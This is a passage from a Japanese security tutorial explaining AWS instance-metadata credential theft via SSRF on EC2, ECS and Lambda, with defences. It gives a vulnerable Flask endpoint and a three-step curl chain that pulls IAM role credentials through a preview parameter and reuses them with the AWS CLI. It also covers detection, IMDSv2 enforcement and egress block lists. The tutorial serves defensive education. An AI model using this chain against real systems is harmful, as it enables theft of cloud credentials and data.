## IMDSv1窃取の実手順（curl/ECS/Lambda）

前節ではSSRFがクラウド環境で「単なる内部リクエスト強制」から「クラウド管理者権限の奪取」に化ける原理を扱った。本節では、その核心である**IMDS(Instance Metadata Service)**からのクレデンシャル窃取を、実際に叩くリクエストのレベルまで分解する。読者が到達すべきゴールは、「なぜ`curl`一発でIAMロールの一時クレデンシャルが取れてしまうのか」をプロトコルの挙動として説明できるようになることと、EC2以外の実行基盤(ECS、Lambda)でも構造は違えど同じ問題が起きうることを理解することである。

### IMDSとは何か、なぜ「認証なし」なのか

IMDSは、EC2インスタンス（および後述するECS/Lambdaなど派生実行環境）が「自分自身の情報」を取得するために用意された、リンクローカルアドレス`169.254.169.254`上で動くHTTPサーバーである。ここでいう「リンクローカル」とは、ルーティングされない（インターネットからは絶対に到達できない）特殊なIPアドレス帯（`169.254.0.0/16`）を指し、そのインスタンス内部からのみアクセス可能という前提で設計されている。

IMDSv1（初期設計、2012年頃から存在）は、この「インスタンス内部からしか届かない」という前提だけを安全性の根拠にしていた。つまり、リクエスト自体に**トークンも認証ヘッダーも一切不要**で、単純な`GET`リクエストを投げれば誰でも（インスタンス上で動くどんなコードでも）応答が返ってくる。これが後述する脆弱性の根本原因である。

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
```

最後のエンドポイントは、そのインスタンスにアタッチされたIAMロールの**一時クレデンシャル**（`AccessKeyId`、`SecretAccessKey`、セッション`Token`、`Expiration`）をJSON形式でそのまま返す。この一時クレデンシャルは、アタッチされたIAMロールとまったく同じ権限を持つ。

> ⚠️ **重要**: ここで返るのはロール名を知っている人間向けの「秘密の情報」ではなく、**リクエストさえ届けば誰でも取れる情報**である。SSRFはまさに「本来インスタンス内部のコードしか投げられないはずのリクエストを、外部の攻撃者が任意のURLとして注入する」ことでこの前提を破壊する。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### 攻撃の前提条件（この4つが揃うと危険）

複数の資料が共通して挙げる前提条件は以下の通りである。

1. **アプリケーション層のSSRF脆弱性**が存在し、ユーザー指定のURL（またはURLの一部）をサーバー側が取得しにいく処理がある（例: URLプレビュー機能、Webhook登録、画像取り込み、PDF生成でのリモートリソース取得など）。
2. そのインスタンス/実行基盤で**IMDSv1が有効**（IMDSv2が「必須」に強制されていない）。
3. 出力先IPに対する**フィルタリングがない**（プライベートIPレンジやリンクローカルアドレスへのアウトバウンドがブロックされていない）。
4. アプリケーションがサーバー側で`requests.get()`のようなライブラリ呼び出しでURLを取得する実装になっている。

> 出典: RKON「Exploit SSRF to gain AWS Credentials」— https://www.rkon.com/articles/exploit-ssrf-to-gain-aws-credentials/

### 脆弱なコードの典型例

AquilaXの記事では、URLプレビュー機能を模した以下のFlaskエンドポイントが例として示されている。

```python
@app.route("/preview")
def preview():
    url = request.args.get("url")
    resp = requests.get(url, timeout=5)
    return jsonify({"content": resp.text})
```

このコードの問題は、`url`パラメータに対して**スキーム検証もホスト検証も一切行わず**、そのまま`requests.get()`に渡している点にある。攻撃者が`url=http://169.254.169.254/...`を指定すると、サーバー（＝EC2インスタンス自身）がIMDSに対してリクエストを発行し、その応答をレスポンスボディとして攻撃者に返してしまう。これは「攻撃者がインスタンス内部にいるコードを間接的に操作している」のと等価であり、SSRFが「内部専用の信頼境界を、外部からのHTTPパラメータ一つで踏み越えさせる」脆弱性である所以がここにある。

RKONの記事では同種の脆弱性がPHPの感情分析（センチメント分析）アプリケーションで再現されており、ユーザー入力を検証せずに外部URLとして解析対象に渡す実装が同じ構造の穴を作っている。

> 出典: RKON「Exploit SSRF to gain AWS Credentials」— https://www.rkon.com/articles/exploit-ssrf-to-gain-aws-credentials/

### curlでの実攻撃手順（60秒で完了する理由）

AquilaXの記事は、悪用チェーン全体を以下の3ステップに整理している。実際の攻撃はSSRFの脆弱なパラメータを経由して行うため、下記の`curl`は「攻撃対象アプリケーションのプレビュー機能を経由してIMDSにリクエストを転送させる」形になる。

**ステップ1: ロール名の列挙**

```bash
curl "https://app.example.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

このエンドポイントは、インスタンスにアタッチされているIAMロール名の一覧をプレーンテキストで返す。ロール名がわからなくても、まずこの一覧取得だけでロール名（例: `app-production-role`）を特定できる。

**ステップ2: クレデンシャルの抽出**

```bash
curl "https://app.example.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role"
```

応答としてJSONで一時クレデンシャルがそのまま返る。以下は典型的な応答形式である。

```json
{
  "Code": "Success",
  "LastUpdated": "2026-09-21T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXXXXXXXXXXXXXXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/...",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-09-21T06:00:00Z"
}
```

**ステップ3: AWS CLIへの設定と権限の悪用**

```bash
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjE...

aws sts get-caller-identity   # 取得した権限の確認
aws s3 ls                     # 例: S3バケット列挙
```

こうして取得した一時クレデンシャルは、そのロールが持つ権限（`s3:*`、`ec2:*`、`iam:*`など、しばしば過剰に付与されている）をそのまま外部から行使できる。AquilaXはこの一連の流れが**特別なエクスプロイトコードなしに60秒未満で完了する**と述べており、「難しい攻撃」ではなく「curlが打てれば誰でも再現できる攻撃」であることが最大の危険性である。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

RKONの記事も同型の攻撃フローを示しており、まず`http://ifconfig.me`のような無害なURLでSSRFの挙動（サーバー側がリクエストを本当に発行しているか）を確認してから、本命のIMDSエンドポイントに切り替えるという偵察の順序を推奨している。これは、いきなり機微なエンドポイントを叩いて検知アラートを誘発するのを避け、まずSSRFの存在自体を安全に確証するという実務的な手順である。

> 出典: RKON「Exploit SSRF to gain AWS Credentials」— https://www.rkon.com/articles/exploit-ssrf-to-gain-aws-credentials/

### なぜIMDSv2でも安心しきれないのか

IMDSv2は、まず`PUT`リクエストでセッショントークンを取得し、以降のメタデータ取得リクエストにそのトークンを`X-aws-ec2-metadata-token`ヘッダーとして付与しなければならない、という2段階の仕組みを導入した。これにより、単純な`GET`だけを転送するタイプのSSRF（例えば、リダイレクトを追従するだけの実装や、GETメソッド固定のプロキシ型SSRF）は原理的に防がれる。

```hcl
metadata_options {
  http_tokens                 = "required"
  http_put_response_hop_limit = 1
}
```

しかし、以下のケースでは依然としてIMDSv2下でも窃取が成立しうる。

- **IMDSv1がそもそも無効化されていない**: IMDSv2は「オプトイン」の設計であり、`HttpTokens`が`required`に明示的に設定されていない限りIMDSv1は生き続ける。
- **SSRFが任意メソッド（PUT含む）を発行できる場合**: アプリケーション側のSSRFがHTTPメソッドを自由に選べる実装（例えばWebhookのカスタムメソッド指定や、SSTIを介した任意HTTPクライアント呼び出し）であれば、攻撃者はPUTでトークンを取得し、続くGETにそのトークンを付与するという2段階を両方ともSSRF経由で再現できる。
- **リダイレクトチェーン**: 攻撃者が制御するドメインへの通常のリクエストが、そこからHTTPリダイレクトでメタデータエンドポイントへ転送されるよう仕込まれているケース。
- **hop-limitはプロキシ転送を防ぐためのものであり、アプリケーション自身が直接投げるリクエストは制限しない**: `HttpPutResponseHopLimit`（デフォルト値1）は、コンテナ経由などでホップ数が増えるリクエストを止める仕組みであり、アプリケーションコード自身が直接IMDSにリクエストする場合には無関係である。

HackIndexの記事は、IMDSv1が有効かどうかを外部からの偵察・非侵入的なやり方で判定する手段として、AWS APIレベルでの検出とインスタンスシェル内での検出の2通りを挙げている（後者は防御側の監査手順として有用）。

```bash
# インスタンス内部シェルから: 200ならIMDSv1有効、401ならIMDSv2強制済み
curl -s -o /dev/null -w '%{http_code}\n' http://169.254.169.254/latest/meta-data/
```

また、`describe-instances`のフィルタで`MetadataOptions.HttpTokens==optional`を検索することで、組織内でIMDSv1が有効なままのインスタンスを全リージョン横断で洗い出せることも指摘されている。これは攻撃者の偵察手段であると同時に、防御側が自組織の棚卸しに使うべき手順でもある。

> 出典: HackIndex「SSRF to IMDS Credential Theft」— https://hackindex.io/platforms/aws/exploitation/ec2/ec2-ssrf-imds-credential-theft

### ECSでのクレデンシャル窃取（構造が違う理由）

ECS（Elastic Container Service）タスクはEC2インスタンスとは異なるクレデンシャル供給経路を持つ。ECSタスクには`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`という環境変数が注入されており、これが以下のようなタスク固有のエンドポイントを指す。

```
http://169.254.170.2/v2/credentials/[uuid]
```

このアドレス`169.254.170.2`はEC2の`169.254.169.254`とは別のリンクローカルアドレスであり、**タスクごとに異なるUUIDパス**を持つことでタスク間のクレデンシャル分離を意図している。しかし、SSRF単体ではこのUUIDを知らないと取得できない一方、環境変数自体が別の脆弱性（例えばパストラバーサルやテンプレートインジェクションによる環境変数の漏えい）で露出してしまえば、SSRFと組み合わせて直接クレデンシャルを取りに行ける。つまりECSでは「IMDSのロール名列挙」に相当するステップが「環境変数からUUID付きURLを盗み出す」ステップに置き換わるだけで、**攻撃の骨格（認証なしのローカルHTTPエンドポイントから一時クレデンシャルを取得する）は同一**である。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### Lambdaでのクレデンシャル露出（IMDSを経由しない別経路）

Lambda関数はEC2ともECSとも異なり、実行環境自体がメタデータサービスを持たない。その代わり、Lambdaは呼び出しごとに一時クレデンシャルを**環境変数**として直接実行コンテキストに注入する（`AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`、`AWS_SESSION_TOKEN`）。

このため、Lambda環境での「IMDS窃取」に相当する攻撃は、SSRFで`169.254.169.254`を叩くことではなく、**サーバーサイドテンプレートインジェクション（SSTI）や環境変数を読み出せる任意のコード実行/情報漏えい経路**を通じて、プロセスの環境変数そのものを読み出す形を取る。例えばNode.jsのLambdaでSSTIが成立すれば、`process.env`を出力させるだけでクレデンシャルが漏れる。これはIMDSのHTTPエンドポイントを叩く操作とは経路が異なるものの、「実行基盤が用意した認証情報の受け渡し場所に、本来アクセスできないはずの経路からアクセスできてしまう」という本質は共通している。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### 影響の大きさ（実例で理解する）

この種のSSRF→IMDS窃取チェーンは、単体のCVSSスコアで見ても8.8〜9.8（ネットワークからアクセス可能、認証不要、機密性への影響が高い）に分類されることが多い。実例として最も有名なのは2019年のCapital One事件で、WAF（Web Application Firewall）を稼働させていたEC2インスタンスに対するSSRFがIMDS経由でクレデンシャル窃取に悪用され、約1億件の顧客レコードが外部に持ち出された。この事件は「WAFという防御製品自体がSSRFの踏み台になった」という点でも象徴的であり、対策の実装漏れがどのレイヤーにあっても同じ結果に至ることを示している。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### 検知の手がかり（防御側の視点）

窃取されたクレデンシャルが外部から使われた場合、CloudTrailのログには**そのロールのARNが、インスタンス自身のプライベートIPではない外部IPから利用された記録**が残る。これは強い異常シグナルであり、GuardDutyには`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`という専用の検出項目が用意されている。静的解析（Semgrep、CodeQL、Snyk Codeなどのテイント解析ベースのSASTツール）はSSRFの入力元（source、ユーザーが制御できる入力）と出力先（sink、実際にHTTPリクエストが発行される箇所）が明示的に宣言されているパターンであれば検出できるが、動的な文字列結合や間接呼び出しを経由するパターンは見逃されやすい。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### 防御策（本節のまとめ）

本節で扱った防御目的の要点を、実装レベルで整理する。

**1. IMDSv2の強制（最重要かつ最も費用対効果が高い対策）**

```bash
# 稼働中インスタンスに対して個別に強制する場合
aws ec2 modify-instance-metadata-options \
  --instance-id $INSTANCE_ID \
  --http-tokens required \
  --http-endpoint enabled
```

```hcl
# Terraformで新規/既存インスタンスに恒久設定する場合
metadata_options {
  http_tokens                 = "required"
  http_put_response_hop_limit = 1
}
```

`http_tokens = "required"`によってIMDSv1のGETのみのリクエストは拒否される（`401`を返す）ようになるため、単純なSSRFでは窃取できなくなる。ただし前述の通り、PUTを含む任意メソッドを発行できるSSRFには効果が限定的である点は覚えておく必要がある。

**2. アプリケーション層での出力検証（多層防御の一段目）**

- スキームをhttp/httpsのみに制限する。
- ユーザー指定URLのホスト名を解決した上で、解決後のIPアドレスをブロックリストと照合する（DNSリバインディング対策として、検証時と実際のリクエスト時のIPが一致することも確認する）。
- 以下のプライベート/リンクローカルCIDRへのアウトバウンドを拒否する。

```
10.0.0.0/8        # プライベート
172.16.0.0/12     # プライベート
192.168.0.0/16    # プライベート
169.254.0.0/16    # リンクローカル（IMDSはここに含まれる）
127.0.0.0/8       # ループバック
```

**3. 権限の最小化（クレデンシャルが盗まれても被害を抑える）**

IAMロールに対して最小権限の原則を適用し、可能であれば`aws:SourceIp`などの条件付きポリシーでリソースレベルの制限をかける。これにより、万一クレデンシャルが窃取されても被害範囲（blast radius）を限定できる。

**4. SCP（Service Control Policy）とSSMによる組織全体の統制**

AWS Organizationsのサービスコントロールポリシーで、IMDSv2を強制しないインスタンス起動自体を拒否する、あるいはAWS SSM Automationドキュメントで既存インスタンスに一括してIMDSv2強制を適用する、という組織レベルの統制も有効な手段として挙げられている。

> 出典: RKON「Exploit SSRF to gain AWS Credentials」— https://www.rkon.com/articles/exploit-ssrf-to-gain-aws-credentials/

これら3資料に共通する結論は一つである。IMDSv1が「認証なしでローカルHTTPリクエストに応答する」という設計そのものが脆弱性の根であり、SSRFはその設計上の弱点を外部から突くための「入り口」に過ぎない。したがって最も確実な対策はSSRF自体を潰すことではなく（アプリケーションは増え続け、すべてのSSRFを潰しきることは現実的ではない）、**IMDSv2の強制という基盤側の設計変更によって、SSRFが成立してもクレデンシャル窃取まで到達させない**という多層防御の発想である。
